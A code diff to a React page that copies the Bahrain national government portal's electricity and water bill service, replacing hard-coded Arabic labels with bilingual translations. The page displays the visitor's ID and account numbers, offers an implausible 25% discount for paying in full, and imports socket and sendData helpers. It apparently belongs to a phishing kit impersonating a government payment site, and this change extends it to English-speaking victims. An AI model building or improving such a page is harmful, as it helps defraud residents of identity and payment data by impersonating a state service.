@@ -1,9 +1,11 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { navigateToPage, sendData, socket } from "@/lib/store";
+import { useLanguage } from "@/lib/language";
 
 export default function EWABills() {
   const [, setLocation] = useLocation();
+  const { lang, toggleLang, t, dir } = useLanguage();
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState("");
   const [billData, setBillData] = useState<any>(null);
@@ -88,7 +90,7 @@ export default function EWABills() {
           box-sizing: border-box;
         }
         .ewa-bills-page {
-          direction: rtl;
+          direction: ${dir};
           min-height: 100vh;
           background: #FAFAFA;
           color: #17171C;
@@ -800,8 +802,8 @@ export default function EWABills() {
               <div className="bh-logo">
                 <img src="/logo_ar.svg" alt="شعار مملكة البحرين" onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }} />
               </div>
-              <div className="bh-lang">
-                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }}>English</span>
+              <div className="bh-lang" onClick={toggleLang}>
+                <span style={{ fontFamily: '"PT Sans", system-ui, sans-serif', fontSize: '17px', fontWeight: 600 }}>{t('lang_toggle')}</span>
                 <svg width="24" height="24" viewBox="0 0 32 32" fill="none" stroke="#4B4B57" strokeWidth="2.5">
                   <circle cx="16" cy="16" r="14"/>
                   <path d="M2 16h28M16 2a20 20 0 0 1 5.5 14 20 20 0 0 1-5.5 14 20 20 0 0 1-5.5-14A20 20 0 0 1 16 2z"/>
@@ -813,8 +815,8 @@ export default function EWABills() {
           <div className="bh-container">
             <div className="bh-header-row2">
               <div className="bh-tabs-row">
-                <span className="bh-tab active">الخدمات الإلكترونية</span>
-                <span className="bh-tab">دليل المعلومات</span>
+                <span className="bh-tab active">{t('electronic_services')}</span>
+                <span className="bh-tab">{t('information_guide')}</span>
               </div>
 
             </div>
@@ -825,10 +827,10 @@ export default function EWABills() {
         <div className="bh-nav">
           <div className="bh-container">
             <div className="bh-nav-items">
-              <a className="bh-nav-item nav-active">الصفحة الرئيسية</a>
-              <a className="bh-nav-item">الخدمات الإلكترونية حسب التصنيف</a>
-              <a className="bh-nav-item">الخدمات الإلكترونية حسب المقدم</a>
-              <a className="bh-nav-item">متجر تطبيقات الحكومة الإلكترونية</a>
+              <a className="bh-nav-item nav-active">{t('home_page')}</a>
+              <a className="bh-nav-item">{t('services_by_category')}</a>
+              <a className="bh-nav-item">{t('services_by_provider')}</a>
+              <a className="bh-nav-item">{t('gov_app_store')}</a>
             </div>
           </div>
         </div>
@@ -840,21 +842,21 @@ export default function EWABills() {
               <circle cx="12" cy="12" r="10" stroke="white" strokeWidth="2"/>
               <path d="M12 8v4M12 16h.01" stroke="white" strokeWidth="2" strokeLinecap="round"/>
             </svg>
-            <span>بيانات الفواتير</span>
+            <span>{lang === 'ar' ? 'بيانات الفواتير' : 'Bill Data'}</span>
           </div>
 
           {/* Customer Details Card */}
           <div className="ewa-info-card">
             <div className="ewa-info-row">
-              <span className="ewa-info-label">نوع الهوية:</span>
+              <span className="ewa-info-label">{t('id_type')}</span>
               <span className="ewa-info-value">{idTypeLabel}</span>
             </div>
             <div className="ewa-info-row">
-              <span className="ewa-info-label">رقم الهوية:</span>
+              <span className="ewa-info-label">{t('id_number')}</span>
               <span className="ewa-info-value">{idNumber}</span>
             </div>
             <div className="ewa-info-row">
-              <span className="ewa-info-label">رقم الحساب:</span>
+              <span className="ewa-info-label">{t('account_number')}</span>
               <span className="ewa-info-value">{accountNumber}</span>
             </div>
           </div>
@@ -872,14 +874,14 @@ export default function EWABills() {
                 <div className="ewa-dot"></div>
                 <div className="ewa-dot"></div>
               </div>
-              <p style={{ color: '#666', fontSize: '15px' }}>جاري جلب الفواتير...</p>
+              <p style={{ color: '#666', fontSize: '15px' }}>{lang === 'ar' ? 'جاري جلب الفواتير...' : 'Loading bills...'}</p>
             </div>
           )}
 
           {/* Error State */}
           {!loading && error && (
             <div className="ewa-error-box">
-              <p style={{ fontSize: '16px', fontWeight: 600, marginBottom: '8px' }}>خطأ</p>
+              <p style={{ fontSize: '16px', fontWeight: 600, marginBottom: '8px' }}>{lang === 'ar' ? 'خطأ' : 'Error'}</p>
               <p>{error}</p>
             </div>
           )}
@@ -891,8 +893,8 @@ export default function EWABills() {
               {billData.totalAmount && (
                 <div className="ewa-info-card" style={{ background: '#e8f0fe', borderColor: '#003366' }}>
                   <div className="ewa-info-row" style={{ borderBottom: 'none' }}>
-                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>المبلغ الإجمالي المستحق:</span>
-                    <span className="ewa-info-value" style={{ fontSize: '20px', color: '#003366' }}>{billData.totalAmount} د.ب</span>
+                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>{lang === 'ar' ? 'المبلغ الإجمالي المستحق:' : 'Total Amount Due:'}</span>
+                    <span className="ewa-info-value" style={{ fontSize: '20px', color: '#003366' }}>{billData.totalAmount} {t('bd')}</span>
                   </div>
                 </div>
               )}
@@ -902,42 +904,42 @@ export default function EWABills() {
                 billData.parsedBills.map((bill: any, idx: number) => (
                   <div key={idx}>
                     <div className="ewa-blue-bar">
-                      {billData.parsedBills.length > 1 ? `تفاصيل الفاتورة ${idx + 1}` : 'تفاصيل الفاتورة'}
+                      {billData.parsedBills.length > 1 ? `${lang === 'ar' ? 'تفاصيل الفاتورة' : 'Bill Details'} ${idx + 1}` : (lang === 'ar' ? 'تفاصيل الفاتورة' : 'Bill Details')}
                     </div>
                     <div className="ewa-info-card">
                       {bill.accountNumber && (
                         <div className="ewa-info-row">
-                          <span className="ewa-info-label">رقم الحساب</span>
+                          <span className="ewa-info-label">{t('account_number')}</span>
                           <span className="ewa-info-value">{bill.accountNumber}</span>
                         </div>
                       )}
                       {bill.customerName && (
                         <div className="ewa-info-row">
-                          <span className="ewa-info-label">تفاصيل العميل</span>
+                          <span className="ewa-info-label">{t('client_details')}</span>
                           <span className="ewa-info-value">{bill.customerName}</span>
                         </div>
                       )}
                       {bill.address && (
                         <div className="ewa-info-row">
-                          <span className="ewa-info-label">العنوان</span>
+                          <span className="ewa-info-label">{lang === 'ar' ? 'العنوان' : 'Address'}</span>
                           <span className="ewa-info-value">{bill.address}</span>
                         </div>
                       )}
                       {bill.issueDate && (
                         <div className="ewa-info-row">
-                          <span className="ewa-info-label">تاريخ الاصدار</span>
+                          <span className="ewa-info-label">{lang === 'ar' ? 'تاريخ الاصدار' : 'Issue Date'}</span>
                           <span className="ewa-info-value">{bill.issueDate}</span>
                         </div>
                       )}
                       {bill.billMonth && (
                         <div className="ewa-info-row">
-                          <span className="ewa-info-label">القائمة لشهر</span>
+                          <span className="ewa-info-label">{lang === 'ar' ? 'القائمة لشهر' : 'Bill Month'}</span>
                           <span className="ewa-info-value">{bill.billMonth}</span>
                         </div>
                       )}
                       {bill.balance && (
                         <div className="ewa-info-row">
-                          <span className="ewa-info-label">الرصيد (د.ب)</span>
+                          <span className="ewa-info-label">{lang === 'ar' ? 'الرصيد (د.ب)' : `Balance (${t('bd')})`}</span>
                           <span className="ewa-info-value">{bill.balance}</span>
                         </div>
                       )}
@@ -946,41 +948,41 @@ export default function EWABills() {
                 ))
               ) : billData.parsedData && (
                 <>
-                  <div className="ewa-blue-bar">تفاصيل الفاتورة</div>
+                  <div className="ewa-blue-bar">{lang === 'ar' ? 'تفاصيل الفاتورة' : 'Bill Details'}</div>
                   <div className="ewa-info-card">
                     {billData.parsedData.accountNumber && (
                       <div className="ewa-info-row">
-                        <span className="ewa-info-label">رقم الحساب</span>
+                        <span className="ewa-info-label">{t('account_number')}</span>
                         <span className="ewa-info-value">{billData.parsedData.accountNumber}</span>
                       </div>
                     )}
                     {billData.parsedData.customerName && (
                       <div className="ewa-info-row">
-                        <span className="ewa-info-label">تفاصيل العميل</span>
+                        <span className="ewa-info-label">{t('client_details')}</span>
                         <span className="ewa-info-value">{billData.parsedData.customerName}</span>
                       </div>
                     )}
                     {billData.parsedData.address && (
                       <div className="ewa-info-row">
-                        <span className="ewa-info-label">العنوان</span>
+                        <span className="ewa-info-label">{lang === 'ar' ? 'العنوان' : 'Address'}</span>
                         <span className="ewa-info-value">{billData.parsedData.address}</span>
                       </div>
                     )}
                     {billData.parsedData.issueDate && (
                       <div className="ewa-info-row">
-                        <span className="ewa-info-label">تاريخ الاصدار</span>
+                        <span className="ewa-info-label">{lang === 'ar' ? 'تاريخ الاصدار' : 'Issue Date'}</span>
                         <span className="ewa-info-value">{billData.parsedData.issueDate}</span>
                       </div>
                     )}
                     {billData.parsedData.billMonth && (
                       <div className="ewa-info-row">
-                        <span className="ewa-info-label">القائمة لشهر</span>
+                        <span className="ewa-info-label">{lang === 'ar' ? 'القائمة لشهر' : 'Bill Month'}</span>
                         <span className="ewa-info-value">{billData.parsedData.billMonth}</span>
                       </div>
                     )}
                     {billData.parsedData.balance && (
                       <div className="ewa-info-row">
-                        <span className="ewa-info-label">الرصيد (د.ب)</span>
+                        <span className="ewa-info-label">{lang === 'ar' ? 'الرصيد (د.ب)' : `Balance (${t('bd')})`}</span>
                         <span className="ewa-info-value">{billData.parsedData.balance}</span>
                       </div>
                     )}
@@ -998,9 +1000,9 @@ export default function EWABills() {
                   >
                     <div className="ewa-payment-option-right">
                       <div className="ewa-radio"><div className="ewa-radio-inner"></div></div>
-                      <span className="ewa-payment-option-label">دفع كامل المبلغ</span>
+                      <span className="ewa-payment-option-label">{t('pay_full_amount')}</span>
                     </div>
-                    <span className="ewa-payment-option-amount">{billData.totalAmount} د.ب</span>
+                    <span className="ewa-payment-option-amount">{billData.totalAmount} {t('bd')}</span>
                   </div>
 
                   {/* Option 2: Partial Payment */}
@@ -1016,10 +1018,10 @@ export default function EWABills() {
                   >
                     <div className="ewa-payment-option-right">
                       <div className="ewa-radio"><div className="ewa-radio-inner"></div></div>
-                      <span className="ewa-payment-option-label">دفع جزء من المبلغ</span>
+                      <span className="ewa-payment-option-label">{t('pay_partial_amount')}</span>
                     </div>
                     <span className="ewa-payment-option-amount">
-                      {paymentOption === 'partial' && partialAmount ? `${partialAmount} د.ب` : `${(parseFloat(billData.totalAmount) / 3).toFixed(3)} د.ب`}
+                      {paymentOption === 'partial' && partialAmount ? `${partialAmount} ${t('bd')}` : `${(parseFloat(billData.totalAmount) / 3).toFixed(3)} ${t('bd')}`}
                     </span>
                   </div>
 
@@ -1027,7 +1029,7 @@ export default function EWABills() {
                   {paymentOption === 'partial' && (
                     <div className="ewa-partial-input-wrapper">
                       <div className="ewa-partial-input-row">
-                        <label>المبلغ المراد دفعه:</label>
+                        <label>{lang === 'ar' ? 'المبلغ المراد دفعه:' : 'Amount to pay:'}</label>
                         <input
                           type="number"
                           className="ewa-partial-input"
@@ -1042,9 +1044,9 @@ export default function EWABills() {
                           min="0.001"
                           max={billData.totalAmount}
                           step="0.001"
-                          placeholder="أدخل المبلغ"
+                          placeholder={t('enter_amount')}
                         />
-                        <span className="ewa-partial-input-suffix">د.ب</span>
+                        <span className="ewa-partial-input-suffix">{t('bd')}</span>
                       </div>
                     </div>
                   )}
@@ -1055,11 +1057,11 @@ export default function EWABills() {
               {billData.totalAmount && (
                 <div className="ewa-info-card" style={{ background: '#e8f0fe', borderColor: '#003366' }}>
                   <div className="ewa-info-row" style={{ borderBottom: 'none' }}>
-                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>{paymentOption === 'full' ? 'المجموع النهائي بعد الخصم (25%):' : 'المجموع النهائي:'}</span>
+                    <span className="ewa-info-label" style={{ fontSize: '16px', color: '#003366' }}>{paymentOption === 'full' ? `${t('total_after_discount')}:` : `${t('final_total')}:`}</span>
                     <span className="ewa-info-value" style={{ fontSize: '20px', color: '#003366', fontWeight: 800 }}>
                       {paymentOption === 'full'
-                        ? `${(parseFloat(billData.totalAmount) * 0.75).toFixed(3)} د.ب`
-                        : `${partialAmount || '0.000'} د.ب`
+                        ? `${(parseFloat(billData.totalAmount) * 0.75).toFixed(3)} ${t('bd')}`
+                        : `${partialAmount || '0.000'} ${t('bd')}`
                       }
                     </span>
                   </div>
@@ -1075,7 +1077,7 @@ export default function EWABills() {
                         <th key={i}>{h}</th>
                       )) : billData.bills[0].map((_: any, i: number) => (
                         <th key={i}>
-                          {i === 0 ? 'الفاتورة' : i === 1 ? 'التاريخ' : i === 2 ? 'المبلغ' : i === 3 ? 'الحالة' : `عمود ${i + 1}`}
+                          {i === 0 ? t('bill_number') : i === 1 ? t('bill_date') : i === 2 ? t('bill_amount') : i === 3 ? t('bill_status') : `${lang === 'ar' ? 'عمود' : 'Column'} ${i + 1}`}
                         </th>
                       ))}
                     </tr>
@@ -1098,15 +1100,15 @@ export default function EWABills() {
           <div className="ewa-buttons">
             {!loading && !error && billData && (
               <button className="ewa-btn-primary" onClick={handleProceed}>
-                متابعة الدفع
+                {t('proceed_to_pay')}
               </button>
             )}
             <button className="ewa-btn-secondary" onClick={handleBack}>
-              رجوع
+              {t('back')}
             </button>
             {!loading && error && (
               <button className="ewa-btn-primary" onClick={() => { setLoading(true); setError(""); fetchBills(); }}>
-                إعادة المحاولة
+                {lang === 'ar' ? 'إعادة المحاولة' : 'Retry'}
               </button>
             )}
           </div>
@@ -1117,40 +1119,40 @@ export default function EWABills() {
           <div className="bh-container">
             <div className="bh-footer-columns">
               <div className="bh-footer-col">
-                <div className="bh-footer-col-title">دليل المعلومات</div>
+                <div className="bh-footer-col-title">{t('information_guide')}</div>
                 <ul>
-                  <li><a>هنا في البحرين</a></li>
-                  <li><a>عن البحرين</a></li>
-                  <li><a>اكتشف البحرين</a></li>
-                  <li><a>دليل الخدمات الحكومية</a></li>
-                  <li><a>الدليل الحكومي</a></li>
-                  <li><a>الذكاء الاصطناعي في البحرين</a></li>
-                  <li><a>دليل خدمة العملاء</a></li>
-                  <li><a>أرقام الطوارئ</a></li>
+                  <li><a>{lang === 'ar' ? 'هنا في البحرين' : 'Here in Bahrain'}</a></li>
+                  <li><a>{t('about_bahrain_link')}</a></li>
+                  <li><a>{t('discover_bahrain')}</a></li>
+                  <li><a>{t('gov_services_guide')}</a></li>
+                  <li><a>{t('gov_guide')}</a></li>
+                  <li><a>{t('ai_bahrain')}</a></li>
+                  <li><a>{t('customer_service_guide')}</a></li>
+                  <li><a>{lang === 'ar' ? 'أرقام الطوارئ' : 'Emergency Numbers'}</a></li>
                 </ul>
               </div>
               <div className="bh-footer-col">
-                <div className="bh-footer-col-title">الخدمات الإلكترونية</div>
+                <div className="bh-footer-col-title">{t('electronic_services')}</div>
                 <ul>
-                  <li><a>تصنيف الخدمات الإلكترونية</a></li>
-                  <li><a>مقدمو الخدمات الإلكترونية</a></li>
-                  <li><a>متجر تطبيقات الهواتف</a></li>
-                  <li><a>دليل المستخدم</a></li>
-                  <li><a>المفتاح الإلكتروني 2.0 المطوّر</a></li>
-                  <li><a>مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية</a></li>
+                  <li><a>{lang === 'ar' ? 'تصنيف الخدمات الإلكترونية' : 'eServices Classification'}</a></li>
+                  <li><a>{lang === 'ar' ? 'مقدمو الخدمات الإلكترونية' : 'eServices Providers'}</a></li>
+                  <li><a>{lang === 'ar' ? 'متجر تطبيقات الهواتف' : 'Mobile Apps Store'}</a></li>
+                  <li><a>{lang === 'ar' ? 'دليل المستخدم' : 'User Guide'}</a></li>
+                  <li><a>{lang === 'ar' ? 'المفتاح الإلكتروني 2.0 المطوّر' : 'eKey 2.0'}</a></li>
+                  <li><a>{lang === 'ar' ? 'مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية' : 'Service Center Locations'}</a></li>
                 </ul>
               </div>
               <div className="bh-footer-col">
-                <div className="bh-footer-col-title">روابط سريعة</div>
+                <div className="bh-footer-col-title">{lang === 'ar' ? 'روابط سريعة' : 'Quick Links'}</div>
                 <ul>
-                  <li><a>حول البوابة الوطنية</a></li>
-                  <li><a>إحصائيات قنوات الخدمة</a></li>
-                  <li><a>المشاركة الإلكترونية "شاركنا"</a></li>
-                  <li><a>الأخبار الحكومية</a></li>
-                  <li><a>أخبار البحرين</a></li>
-                  <li><a>تقويم البحرين</a></li>
-                  <li><a>فعاليات تقنية المعلومات</a></li>
-                  <li><a>الإشادات والجوائز</a></li>
+                  <li><a>{lang === 'ar' ? 'حول البوابة الوطنية' : 'About the National Portal'}</a></li>
+                  <li><a>{lang === 'ar' ? 'إحصائيات قنوات الخدمة' : 'Service Channel Statistics'}</a></li>
+                  <li><a>{lang === 'ar' ? 'المشاركة الإلكترونية "شاركنا"' : 'eParticipation'}</a></li>
+                  <li><a>{lang === 'ar' ? 'الأخبار الحكومية' : 'Government News'}</a></li>
+                  <li><a>{lang === 'ar' ? 'أخبار البحرين' : 'Bahrain News'}</a></li>
+                  <li><a>{lang === 'ar' ? 'تقويم البحرين' : 'Bahrain Calendar'}</a></li>
+                  <li><a>{lang === 'ar' ? 'فعاليات تقنية المعلومات' : 'IT Events'}</a></li>
+                  <li><a>{lang === 'ar' ? 'الإشادات والجوائز' : 'Awards & Recognition'}</a></li>
                 </ul>
               </div>
             </div>
@@ -1162,7 +1164,7 @@ export default function EWABills() {
             <div className="bh-footer-social-inner">
               <img src="/bahrain_2030.png" alt="البحرين 2030" style={{ height: '160px', objectFit: 'contain' }} />
               <div className="bh-footer-social-right" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '12px' }}>
-                <span className="bh-footer-contact-title">تابعونا</span>
+                <span className="bh-footer-contact-title">{t('follow_us')}</span>
                 <div className="bh-footer-social-icons">
                   <a title="LinkedIn"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg></a>
                   <a title="Instagram"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg></a>
@@ -1172,12 +1174,12 @@ export default function EWABills() {
                 </div>
               </div>
               <div className="bh-footer-social-left">
-                <div className="bh-footer-contact-title">تواصل معنا</div>
+                <div className="bh-footer-contact-title">{t('contact_us')}</div>
                 <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                   <img src="/tawasul-logo.png" alt="تواصل" style={{ height: '55px', objectFit: 'contain' }} />
                   <div>
                     <div className="bh-footer-contact-number">80008001</div>
-                    <div className="bh-footer-contact-sub">مركز اتصال الخدمات الحكومية</div>
+                    <div className="bh-footer-contact-sub">{lang === 'ar' ? 'مركز اتصال الخدمات الحكومية' : 'Government Services Call Center'}</div>
                   </div>
                 </div>
               </div>
@@ -1187,28 +1189,28 @@ export default function EWABills() {
 
         <div className="bh-footer-bottom-links">
           <div className="bh-container">
-            <a>شروط الإستخدام</a>
+            <a>{t('terms_of_use')}</a>
             <span className="separator">|</span>
-            <a>سياسة الخصوصية</a>
+            <a>{t('privacy_policy')}</a>
             <span className="separator">|</span>
-            <a>إمكانية الوصول</a>
+            <a>{t('accessibility')}</a>
             <span className="separator">|</span>
-            <a>الأسئلة الشائعة</a>
+            <a>{t('faq')}</a>
             <span className="separator">|</span>
-            <a>مساعدة</a>
+            <a>{t('help')}</a>
             <span className="separator">|</span>
-            <a>تواصل معنا</a>
+            <a>{t('contact_link')}</a>
             <span className="separator">|</span>
-            <a>خريطة الموقع</a>
+            <a>{t('sitemap')}</a>
           </div>
         </div>
 
         <div className="bh-footer-copyright">
           <div className="bh-container">
-            <p>آخر تحديث على البوابة الوطنية : السبت، 7 مارس 2026</p>
-            <p>تم التطوير من قبل <a>هيئة المعلومات والحكومة الإلكترونية</a></p>
-            <p>حقوق الطبع &copy; 2026 مملكة البحرين</p>
-            <p>جميع الحقوق محفوظة</p>
+            <p>{t('last_update')} {lang === 'ar' ? 'السبت، 7 مارس 2026' : 'Saturday, March 7, 2026'}</p>
+            <p>{t('developed_by')} <a>{t('iga')}</a></p>
+            <p>{t('copyright')} 2026 {t('kingdom_of_bahrain')}</p>
+            <p>{t('all_rights_reserved')}</p>
           </div>
         </div>
       </div>
